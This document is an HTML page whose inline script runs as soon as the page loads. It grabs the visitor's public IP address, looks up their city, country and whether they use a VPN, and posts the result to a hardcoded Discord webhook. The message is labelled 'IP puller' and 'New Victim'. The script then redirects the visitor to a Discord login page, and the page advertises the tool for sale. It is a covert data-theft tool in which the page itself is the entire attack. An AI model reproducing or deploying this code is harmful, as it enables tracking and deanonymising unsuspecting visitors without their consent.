<!DOCTYPE html>
<html lang="en">
<head>

</head>
<body>
    <script>
    function json(url) {
        return fetch(url).then(res => res.json());
    }

    function getMyIP() {
        let apiKey = 'YOUR_API_KEY';  // Replace with your actual ipinfo.io API key
        let webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';

        // Fetch the public IP address of the user
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(ipData => {
                const ip = ipData.ip;
                
                // Check if the IP belongs to a VPN using ipinfo.io (replace with a real API key)
                fetch(`https://ipinfo.io/${ip}/json?token=${apiKey}`)
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Failed to fetch IP info');
                        }
                        return response.json();
                    })
                    .then(ipInfo => {
                        const isVpn = ipInfo.org && ipInfo.org.toLowerCase().includes("vpn");

                        // If a VPN is detected, send a webhook with that information
                        let message = {
                            embeds: [
                                {
                                    title: "@everyone King von IP puller ðŸ˜ˆ",
                                    description: `** New Victim**\nIP: ||${ip}||\nCity: ${ipInfo.city}\nCountry: ${ipInfo.country}\nVPN Detected: ${isVpn ? 'Yes' : 'No'}\nBY RUNTZ PURCHASE TODAY!`,
                                    image: {
                                        url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
                                    },
                                    color: 0x007BFF
                                }
                            ]
                        };

                        // Send the data to Discord webhook
                        fetch(webhookURL, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(message)
                        }).then(() => {
                            window.location.href = "https://discord.gg/login";
                        }).catch(err => {
                            console.error('Error sending to webhook:', err);
                        });
                    })
                    .catch(err => {
                        console.error('Error fetching IP info:', err);
                    });
            })
            .catch(err => {
                console.error('Error fetching IP address:', err);
            });
    }

    // Call the function to get IP and check VPN
    getMyIP();

    </script>
</body>
